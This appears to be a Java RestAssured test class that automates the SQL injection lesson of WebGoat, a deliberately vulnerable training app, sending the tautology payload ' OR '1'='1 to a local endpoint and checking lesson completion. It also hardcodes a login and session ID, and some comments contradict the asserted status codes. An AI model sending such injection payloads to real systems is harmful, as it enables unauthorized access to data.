package tests;

import static io.restassured.RestAssured.given;
import static io.restassured.http.ContentType.URLENC;
import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.equalTo;
import static org.testng.Assert.assertEquals;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.HashMap;
import java.util.Map;

import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeTest;
import org.testng.annotations.Test;

import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import io.restassured.http.Cookie;
import io.restassured.response.Response;
import io.restassured.specification.RequestSpecification;

public class WebGoatTest extends BaseTestApi {
	private static final Logger logger = LogManager.getLogger(WebGoatTest.class);

	private static String sqlInjectionEndpoint = "/WebGoat/SqlInjection/attack8";
	private static String loginEndpoint = "/WebGoat/login";
	private static String Redirection;
	

	@Test(priority = 1, enabled=false)
	public void testLoginAndGetSessionId() {
		System.out.println("Login Requests--------------->");
		String username = "shivamkathayat";
		String password = "1234567";
		
		Response getLoginPage = this.req().basePath(loginEndpoint).when().get();
		System.out.println(getLoginPage.getCookie("JSESSIONID"));
		

		Response loginResponse = this.req().basePath(loginEndpoint)
				.formParam("username", username).formParam("password", password).when().post().then().statusCode(302)
				.extract().response();
		System.out.println(loginResponse.getStatusCode());

		// Extract new JSESSIONID from redirected response headers
		jsessionId = loginResponse.getCookie("JSESSIONID");
		Cookie c = loginResponse.getDetailedCookie("JSESSIONID");
		System.out.println("SESSION ID FOUND: " + jsessionId);
		Redirection = loginResponse.getHeader("Location");
		System.out.println(Redirection);

		Response response2 = req(jsessionId).contentType(ContentType.URLENC).get(Redirection);
		assertEquals(response2.statusCode(), 200);
		System.out.println("Statuscode" + response2.statusCode());
		System.out.println("------------");
	}

	@Test(priority = 2)
	public void testSuccessfulSqlInjection() {
		System.out.println("SQLInjection Requests--------------->");
		// Positive scenario - Successful SQL injection
//		String payload = "name=a&auth_tan=' OR '1'='1";
		Map<String, String> im = new HashMap<String, String>();
		im.put("name", "A");
		im.put("auth_tan", "' OR '1'='1");

		String strb = "name=A&auth_tan=' OR '1'='1";
		Response response = req("GpZ745UPYQooQzPrS3ESrLUgC6VxFHOZP9-r4Q").basePath(sqlInjectionEndpoint)
				.header("Host","localhost:8080")
				.body(strb)
				.post();

		// Check for authentication failure
//		if (response.getStatusCode() == 400) {
//			// If authentication fails, attempt login again
//			testLoginAndGetSessionId();
//			// Retry the request
//			response = req.baseUri(baseUrl).basePath(sqlInjectionEndpoint).contentType(URLENC).headers("Accept",
//					"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
//					.headers("Accept-Encoding", "gzip, deflate, br, zstd").headers("Connection", "keep-alive")
//					.cookie("JSESSIONID", sessionId).body(payload).when().log().all().post();
//
//		}

		
		System.out.println(response.statusCode());
	}

	@Test(priority = 3, enabled = true)
	public void testEmptyName() {

		// Negative scenario - Empty name parameter
		String payload = "&auth_tan=' OR '1'='1";

		Response response = req("GpZ745UPYQooQzPrS3ESrLUgC6VxFHOZP9-r4Q").basePath(sqlInjectionEndpoint).contentType(URLENC).body(payload).when().post();

		response.then().statusCode(302) // Assuming a 400 Bad Request for invalid data
				.and().body("lessonCompleted", equalTo(true)).and()
				.body("feedback", containsString("compromised the confidentiality of data"));
	}

	@Test(priority = 4, enabled = true)
	public void testInvalidSqlInjection() {
		// Negative scenario - Invalid SQL injection syntax
		String payload = "name=a&auth_tan='invalid_injection'";

		Response response = req(jsessionId).basePath(sqlInjectionEndpoint).contentType(URLENC)
				.body(payload).when().post();

		response.then().statusCode(302) // Assuming a 200 response even for failed injection attempts
				.and().body("lessonCompleted", equalTo(false)); // Assuming the response indicates failure
	}
}